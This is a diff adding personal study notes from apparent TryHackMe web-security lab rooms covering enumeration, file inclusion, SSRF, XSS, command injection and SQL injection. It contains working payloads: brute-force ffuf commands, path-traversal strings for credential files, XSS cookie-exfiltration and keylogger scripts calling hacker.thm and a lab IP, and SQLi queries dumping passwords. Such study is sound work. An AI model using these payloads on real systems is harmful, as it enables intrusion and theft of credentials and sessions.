@@ -1,0 +1,575 @@
+______________________
+Walking An Application
+----------------------
+
+A good place to start is simply exploring the website and jotting notes of each page/feature/etc
+
+page source - human-readable code returned from web server when a request is made
+	- made up of HTML, CSS, and Javascript
+
+developer tools - tool kit to aid web developers in debugging and provides us with an under the hood view of a website
+
+inspector - provides live representation of what's on the website, which we can edit and interact with
+
+debugger - intended for debugging JavaScript (called Sources on Google Chrome)
+
+network - used to keep track of external requests a webpage makes
+
+AJAX - is a method for sending and receiving network data in a web app without changing current web page
+
+_________________
+Content Discovery
+-----------------
+3 methods of content discovery: manual, automated, OSINT
+
+robots.txt - file tells which pages are(n't) allowed to be shown by search engine's results
+	- can also ban specific engines from crawling the website entirely
+
+favicon - small icon displayed in address bar/tab for branding a website
+
+	- Command: curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
+	- https://wiki.owasp.org/index.php/OWASP_favicon_database used to cross match found hash to a framework
+
+sitemap.xml - provides list of every file the website owner wishes to be listed on a search engine
+
+http headers - webserver returns various headers when a request to it is made
+	- they can contain information such as webserver software and language(s) used
+	command: curl http://10.10.208.211 -v (Verbose for more in depth information returned)
+
+framework stack - once a framework is established, we can visit its website to gather more information
+
+google dorking - utilizes Google's advanced search engine features
+	site: return results only from specified website address (site:tryhackme.com)
+	inurl: return results that have specified word in URL (inurl:admin)
+	filetype: return results of a particular file extension (filetype:pdf)
+	intitle: return results that contain specified word in the title (intitle:admin)
+
+wappalyzer - online tool (browser extension) that helps identify technologies used by a website
+	- this include frameworks, cms, payment processors, etc. (with version #s)
+
+wayback machine - historical archive of websites dating back to the late 90s
+	- searching for a domain name may uncover old pages that can still be currently active
+
+github - you can search for repositories belonging to a company/website
+	- potential to find source code, passwords, and other content
+
+s3 buckets - with improper permissions, we can access files that shouldn't be available to the public
+	- - http(s)://{name}.s3.amazonaws.com
+	- a common automation technique: {name}-assets, {name}-www, {name}-public, {name}-private, etc.
+	- buckets can also be found using URL's in source code, github repos, automation, for example
+
+automated discovery - using tools send many requests to a web server to find infromation (brute force)
+	- we can check for a website's contents using wordlists
+
+	- ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.208.211/FUZZ
+	- dirb url wordlist; gobuster dir -- url url -w wordlist, are also common techniques
+
+
+______________________
+Subdomain Enumeration
+----------------------
+subdomain enumeration - finding valid subdomains for domain
+	- helpful in discovering more potential points of vulnerability
+	- 3 methods: brute force, OSINT, virtual host
+
+~Brute Force~
+dns - sending large number of possible subdomains from list of commonly used ones
+	- command: dnsrecon -t brt -d acmeitsupport.thm
+	-t: type (brt brute force domains and hosts)
+	-d: target domain
+
+
+~OSINT~
+certificate transparency (CT) logs - public logs of every SSL/TLS certificate created for a domain name
+	- https://crt.sh and https://ui.ctsearch.entrust.com/ui/ctsearchui searchable database of current/historic
+
+search engines - using advanced search engine methods
+	- site:*.domain.com -sit:www.domain.com
+	- this would only contain results leading to domain.com, but exclude any to www.domain.com
+
+sublist3r - similar to dnsrecon, automated tool for OSINT subdomain discovery
+
+~Virtual Host~
+- some subdomains aren't always hosted in publically accessible dns results
+- given 1 web server can host multiple websites, the Host header is used to determine which site the client wants
+- by making changes to this header and monitoring the response, we can find new websites
+	- command: ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt 
+		-H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.94.105 -fs {size}
+	-H: add/edits a header (Host in this example)
+	-w: wordlist being used
+	-fs: page size to exclude results of that size (compare/contrast different sizes of responses of words)	
+*sidenote*: /etc/hosts file maps domain names to IP addresses
+
+_____________________
+Authentication Bypass
+---------------------
+We can use messages received to build list of valid usernames
+	- Ex. "Username already exists" when attempting to create an account
+
+~Username Enumeration~
+
+command: ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST 
+-d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded"
+ -u http://10.10.225.80/customers/signup -mr "username already exists"
+	-w: Wordlist (list of usernames that we'll check exists)
+	-X: specifies the request method (GET by default)
+	-d: specifies data being sent (fields of the forms being found)
+	-H: additional headers for request... setting Content-Type to specify we are sending form data
+	-u: URL request is being made to
+	-mr: text on the page that signifies valid username has been found
+
+It is helpful to create a list of these valid usernames for later usage
+
+~Brute Force~
+
+Using the list of valid usernames, we can brute force the login page
+command: ffuf -w valid_usernames.txt:W1,SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2
+-X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded"
+-u http://10.10.225.80/customers/login -fc 200 
+	-W1: List of valid usernames
+	-W2: Wordlist of potential passwords
+	-w: both W1 and W2 specified using -w, but separated by a comma
+	-fc: checking for status code 200 (successful)
+
+~Logic Flaw~
+
+logic flaw - when typical logical path of an application is either bypassed, circumvented, or manipulated by a hacker
+
+in the thm example, password reset email is sent using data found in the PHP variable $_REQUEST
+	- an array containing data received from the query string and POST data
+	- if the same key name is used for both, logic favors the POST data rather than the query
+	- adding another parameter to the POST form allows us to control where the password reset email gets delivered
+
+by using our email instead of robert's, we receive login link intended for robert in our list of tickets
+
+command: curl 'http://10.10.225.80/customers/reset?email=robert%40acmeitsupport.thm' 
+-H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=alex@customer.acmeitsupport.thm'
+
+
+~Cookie Tampering~
+examining/editing cookies can allow unauthenticated acces, elevated privileges, etc.
+
+command: curl -H "Cookie: logged_in=true; admin=true" http://10.10.225.80/cookie-test
+
+Some cookies may have hashed/encoded values which would need to be disected to revel human-readable string
+	- Online resources such as crackstation.net and base64encode.org can help reveal these values
+Ex.
+Set-Cookie: logged_in=true; Max-Age=3600; Path=/
+Set-Cookie: admin=false; Max-Age=3600; Path=/
+vs
+Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
+the decoded value of the string above is  {"id":1,"admin": false}
+
+____
+IDOR
+-----
+
+idor - insecure direct object reference is a type of access control vulnerability
+	occurs when user input is trusted and not validated on the server side to confirm object belongs to requestor
+
+ex. changing URL value from user_id=10240 to user_id=1 and view another person's information
+
+* a good trick is to create two accounts and swap id #'s of both to see if you can view without being logged in to it
+
+also, check JavaScript file(s) for endpoints with unreferenced parameters (only used in development): parameter mining
+
+
+_______________
+File Inclusion
+--------------
+issue arises when user input not sanitized, user can pass functions to poorly written/iimplemented code (PHP primarily)
+
+~ Path (Directory) Traversal ~
+vulnerability allows attack to read OS resources, such as local files on application server
+	- this way, the URL can be manipulated/abused to locate/access files outside the app's root directory
+	- PHP function: file_get_contents
+
+test out URL params by adding payloads (../../..), must be relevant to OS of the server
+
+-------------------COMMON OS FILES THAT CAN BE USED WHEN TESTING---------------------
+/etc/issue - contains mesage/system identification to be printed before the login prompt
+/etc/profile - controls system-wide default variables, such as Export vars, file creation mask (umask),
+	Terminal types, Mail messges to indicate when new mail has arrived
+/proc/version - specifies the version of the Linux kernel
+/etc/passwd - has all registered users with access to the system (and running processes)
+/etc/shadow - contains information about the system's users' passwords
+/root/.bash_history - contains history commands for root user
+/var/log/dmessage - contains global system messages, including those logged during system startup
+/var/mail/root - all emails for root user
+/root/.ssh/id_rsa - private ssh keys for a root or any known valid user on the server
+/var/log/apach2/access.log - the accessed requests for apache webserver
+c:\boot.ini - contains boot options for computers with BIOS firmware (Windows?)
+
+~ Local File Inclusion ~
+
+not having specified directory in includes function could lead to a direct /lab1.php?file=/etc/passwd
+however, include("languages/". $_GET['lang']); would require:
+	http://webapp.thm/index.php?lang=../../../../etc/passwd to exist languages directory
+
+in black box testing, errors are significant in understanding an app's data passing/processing
+
+Warning: include(includes/.php) [function.include]: failed to open stream: No such file or directory in /var/www/html/lab3.php on line 26
+Warning: include(includes/yo.php) [function.include]: failed to open stream: No such file or directory in /var/www/html/lab3.php on line 26
+	Since all I did was search 'yo', we know:
+	1. shows that includes is specified directory
+	2. .php is being added to the name of requested file name
+
+even if we move out of the php directory, the include function can still read the .php at the end (developer-specified file type for passing)
+%00: NULL BYTE can bypass this (or 0x00 in hex)
+	- this is an injection technique where URL-encoded representation can terminate strings	
+
+doesn't work: http://10.10.204.122/lab3.php?file=../../../../etc/passwd	
+	Warning: include(includes/../../../../etc/passwd.php)
+works: http://10.10.204.122/lab3.php?file=../../../../etc/passwd%00
+
+
+developers may start using input validation:
+	http://webapp.thm/index.php?lang=../../../../etc/passwd
+	Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
+this warning indicates that the web page ../ with empty string
+using: ....//....//....//....//....//etc/passwd
+can bypass this error, as it strips to ../../../../etc/passwd
+
+if developers force the include to read from a defined directory, we can just supply said directory in the payload:
+?lang=languages/../../../../../etc/passwd, where languages is the directory within include function
+
+ex. THM-profile/../../../../etc/os-release
+
+~ Remote File Inclusion ~
+include remote files into a vulnerable application; an attacker can inject an external URL into include function
+- one requirement for RFI is that all_url_fopen option needs to be on
+- higher risk than LFI as attacker can gain RCE on server
+
+1. attacker hosts malicious file on their server
+2. the file is injected into the include function via HTTP requests (url points to attacker's server)
+3. content of the malicious file executes on the vulnerable application server
+
+~ Challenges ~
+Flag 1: ../../../../etc/flag1 filename, change request from GET to POST using burpsuite
+Flag 2: using burp, i noticed when setting THM cookie to admin, i was met with file content preview of 'admin'
+	Cookie: THM=..//..//..//..//etc/flag2%00 set that to reveal flag
+Flag 3: change request to POST and simple ../../../../etc/flag3%00 reveals flag
+
+RCE:
+
+python3 -m http.server (opens port 8000)
+<?php print exec('hostname'); ?> (saved as file 'host.txt')
+file=http://10.6.63.27:8000/host.txt
+
+
+______________
+Intro to SSRF
+--------------
+server-side request forgery
+- vulnerability allows attacker to cause webserver to make additional/edited HTTP request to resource of choosing
+
+regular: data is returned to attacker's screen
+blind: when ssrf occurs, but no information returned to attacker's screen
+
+&x= appended at end of URL will ignore the rest
+
+4 common places to look:
+	when full uRL used in param of address bar
+	partial url such as just the hostname
+	only the path of the url
+	hidden field in a form
+
+~ Defeating Commong SSRF Defences ~
+developers can try using either an allow or deny list to esnure requested resource meets specific rules
+deny list - all requests are accepted aside from those in list or matching a certain pattern
+ex. bypass loclhost 127.0.0.1
+	use 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, or any other subdomains with dns record resolving to 127.0.0.1
+allow list - all requests denied unless explicitly permitted within list
+alternative localhost bypass:
+ex. rule that URL passed must begin with https://website.thm
+	attacker can create subdomain https://website.thm.attackers-domain.thm to bypass
+
+* in a cloud environment, 169.254.169.254 contains metadata for deployed cloud server *
+
+bypass: open riderect is an endpoint on the server where visitor gets automatically redirected to another address
+attacker could redirect internal HTTP request to domain of their choice (best for strict rules)
+
+ex. /private endpoint is blocked...we can try x/../private to bypass
+
+____________
+Intro to XSS
+------------
+cross-site scripting is injection attack where malicious js gets injected into web app to be executed by other users
+payload - code we wish to be executed, made of two parts:
+	intention - what we wish js to actually do
+	modification - changes we make to execute as every scenario is different
+
+example intentions:
+proof of concept - simplest of payloads simply to demonstrate XSS can be achieved
+	<script>alert('XSS');</script>
+
+session stealing - take target's bookie, base64 encode, then post to hacker's website to be logged
+	now, they can take over the target's session and be logged in as that user
+	<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+key logger - anything that is typed (credit card #s, for example) will be forwarded to a website under the hacker's control
+	<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
+business logic - calling a particular network resource or js function; changing user's email address
+	<script>user.changeEmail('attacker@hacker.thm');</script>
+now, an attacker can perform a reset password attack
+
+~ Reflected XSS ~
+occurs when user-supplied data in an HTTP request is included in webpage source without validation
+Ex. a website where an error message is displayed with incorrect input
+	content of error message gets taken from error param in query string and built directly into page source
+	this can be a point of insertion for malicious code
+How to test for rxss:
+	1. params in url query string
+	2. url file path
+	3. (sometimes) http headers
+once you've found data being reflected in web app, you'll need to confirm you can successfully run your payload
+
+~ Stored XSS ~
+payload is stored on web app (database, for example) and run whenever other users visit the site/web page
+Ex. a blog website that allows users to post comments
+	comments might not be checked for js or other malicious code, meaning a payload could be stored on the database
+	now every user visiting the article will have the js run in their browser
+how to test for sxss:
+points of entry where it seems data is stored and shown back in areas that other users have access to
+	1. comments on a blog
+	2. user profile information
+	3. website listings
+
+~ DOM Based XSS ~
+Document Object Model - programming interface for HTML and XML documents
+	represents a page so that prorams can change document structure, style, and content
+occurs when js execution happens directly in browser without new pages loaded/data submitted
+	the code acts on input or user interaction
+Ex. website's js gets contents from window.location.hash parameter and writes that onto the currently viewed page
+	contents of the hash aren't checked for malicious code
+how to test for dxss:
+examine code that access variables an attacker can have control over, such as window.location.x params
+next, observe how they are handled and whether values are ever written to the web page's DOM or passed to unsafe methods such as eval()
+
+~ Blind XSS ~
+similar to stored, but you can't see the payload working or be able to test it against yourself first
+Ex. website contains a contact form that isn't checked for malicious code
+	the messages will be support tickets for staff on a private web portal and executed then
+how to test for bxss:
+ensure your payload has a call back (usually http request); now you'll know if and when your code is being executed
+
+XSS Hunter Express is popular blind XSS tool
+
+~ Perfecting your payload ~
+how your js payload gets reflected in a website's code will determine the payload you need to use
+
+LEVEL ONE:
+A form asks you to enter your name and once entered, your name will be reflected in page source
+	<h2>Hello, name</h2>
+allows us to directly insert:
+	<script>alert('THM');</script>
+
+LEVEL TWO:
+Similar to the above, your name will be reflected into an input tag instead
+	<h2> Hello <input value="name"></h2>
+however, we cannot run from inside input tag, so we need to escape the first input tag to run properly
+	"><script>alert('THM');</script>; "> closes the value parameter and then closes the input tag
+
+LEVEL THREE
+name reflected in textarea tag instead
+	<h2>Hello, <textarea>asdf</textarea></h2>
+escape the textarea tag
+	</textarea><script>alert('THM');</script>
+
+LEVEL FOUR
+name reflected in some other js code
+	document.getElementsByClassName('name')[0].innerHTML='asdf';
+' closes field specifying name, ; signifies end of current command, // comments anything that follows
+	';alert('THM');//
+
+LEVEL FIVE:
+testing with name, we receive
+	<h2>Hello, asdf</h2>
+however, when trying original payload, script is stripped
+	<h2>Hello, <>alert('THM');</></h2>
+workaround for when script is stripped:
+	<sscriptcript>alert('THM')</sscriptcript>; middle script will be removed, leaving script
+
+LEVEL SIX:
+Similar to level two, we can try escaping input tag, but that doesn't work:
+	<img src=""scriptalert('THM');/script">
+we notice < > characters have been filtered out preventing us from escaping img tag
+to escape, we can take advantage of img tag onload event:
+	/images/cat.jpg" onload="alert('THM');
+
+POLYGLOTS:
+string of text which can escape attributes, tags, and bypass filters all in one
+the following will have worked on all six levels:
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
+~ Practical ~
+Walks through submitting support ticket and escaping with textarea (as demonstrated above)
+when viewing latest support ticket, we receive THM pop up 
+
+expanding payload to extract user's cookie and exfiltrate to another webserver of our choice
+1. set up listening service
+	nc -nlvp 9001
+	-l: listen mode, -p: port number, -n: avoid hostname resolution via dns, -v: verbose mode
+
+</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script> 
+</textarea> tag closes field
+fetch() command makes request
+ip: port
+?cookie= query string containing victim's cookies
+btoa() command base64 encodes cookies
+document.cookie accesses victim's cookies
+
+</textarea><script>fetch(‘http://10.6.63.27:9001?cookie=’ + btoa(document.cookie) );</script>
+
+_________________
+Command Injection
+-----------------
+abuse of an app's behavior to execute commands on the os, using same privilege it is running with
+	also known as Remote Code Execution
+
+
+~ Blind ~
+no direct output from application when testing payloads; must investigate application behavior
+	to determine whether payload was successful or not
+to detect:
+use payloads that cause time delay, such as ping or sleep
+force output, using redirection operator, > , for example
+	ex. tell app to execute 'whoami' and redirect to file, then 'cat' this file
+curl is good option since it delivers data to/from an application
+	curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
+
+~ Verbose ~
+direct feedback from application once payload tested, output on page
+to detect, simply examine whether output is displayed
+
+~ Useful payloads ~
+whoami - see user the app is running under
+ls - list contents of current directory (dir on Windows)
+ping - invoke application to hang (useful for testing blind injection)
+sleep - use if ping not installed (timeout on Windows) 
+
+
+In PHP, many functions interact with os to execute commands via shell, including
+	Exec, Passthru, System
+
+sanitizating input is a great prevention technique (only accept #s, remove special characters)
+
+to bypass:
+Ex. an application may strip quotations, but we can use the hex value instead
+
+https://github.com/payloadbox/command-injection-payload-list
+
+
+______________
+SQL Injection
+--------------
+SQLi attacks a web app database server causing execution of malicious queries
+
+relational db - stores info in tables 
+	columns specify/define data being stored and rows store the actual data
+
+non-relational db - doesn't use tables, columns, rows
+	more flexible over relational as each row can contain different info
+
+~ In-Band ~
+easist to detect/exploit
+refes to same method of communication being used to receive results
+	extracts data to the same page
+
+~ Error-Based ~
+most useful for obtaining information about database structure
+	error printed directly on screen, used for enumeration
+
+~ Union-Based ~
+uses union alongside select to return additional results to a page
+	most common way of extracting large amounts of data via vulnerability
+
+to test for error-based, try characters such as ' or " until error message is produced
+
+PRACTICAL
+------In-Band SQLi------
+database() returns database name
+
+group_concat() gets specified column (or table_name) from multiple returned rows
+	and puts it into one string separated by commas
+information_schema
+
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+	list all tables in sql_one database
+
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+	list all columns found in staff_users table
+
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+	list the actual data found in columns of the given table
+	: separates username and password, <br> html tag to put results on separate lines
+
+----Blind SQLi - Authentication Bypass-----
+we aren't interested in retrieving database information; but simply to get past the login
+
+web app isn't necessarily interested in the content of the username/password, instead 
+web app asks database "do you have username _ matching with password _
+
+select * from users where username='%username%' and password='%password%' LIMIT 1;
+	where params are taken from login form fields
+set login field to %username% and password to %password%' OR 1=1;--
+
+
+----Blind SQLi - Boolean Based-----
+refers to response received from attempt, either t/f, y/n, on/off, 1/0 (any response with two outcomes)
+	this outcome confirms whether the payload was successful or not
+
+changing username in address bar shows for 'admin' taken=true, but 'admin123' taken=false
+
+as before, first step is finding number of columns
+after trying admin123' UNION SELECT 1;-- we still see false, suggesting incorrect value of columns
+	keep adding until true...SELECT 1,2,3
+
+now that # of columns found, we can work on enumeration of database name
+admin123' UNION SELECT 1,2,3 where database() like '%';--, inserting a%, etc. and progressing through
+	%sa, %sb, etc.
+
+once db name is found, we can use information_schema to enumerate table names
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';-
+next column names
+	...table_name = 'users' and COLUMN_NAME like '%a';
+if a column name is found, must append and column_name ! = (no space) 'id';, where id was the found column
+
+considering we found that the number of columns was three, we just cycle through as we have before
+	to find column names: id, username, password
+to finally find the password
+	admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+* remember that passwords aren't restricted to letters so we must try numbers, chars, uppercase, etc.*
+
+
+-----Blind SQLI - Time-Based -------
+similar to above, but the indicator of queries being wrong/right depends on time
+SLEEP(X) alongside UNION statement will only get executed upon successful UNION SELECT statement
+
+establishing number of columns:
+admin' UNION SELECT SLEEP(5); has no time delay, meaning we have to add another column
+
+----- Out-of-band SQLi ------
+has two different communication channels: one launches the attack, the second gathers results
+1. attacker makes request to vulnerable website with injection payload
+2. website makes query to db which passes hacker's payload
+3. payload contains request which forces an http back to hacker's machine containing db data
+
+----- Remediation ------
+1. prepared statements
+in a ps, first thing a dev writes is the query and then any user inputs are added as params afterwards
+this ensures the sql code structure doesn't change and the database can distinguish between the query
+and the data
+
+2. input validation
+an allow list can restrict input to only certain strings, or a string replacement method can filter
+	the characters you wish to (dis)allow
+
+3. escaping user input
+allowing inputs containing ',",$,\ can cause queries to break 
+a method of prepending a backslach to these characters, causing them to be parse just as a regular string
+	and not a special character
+
+
+
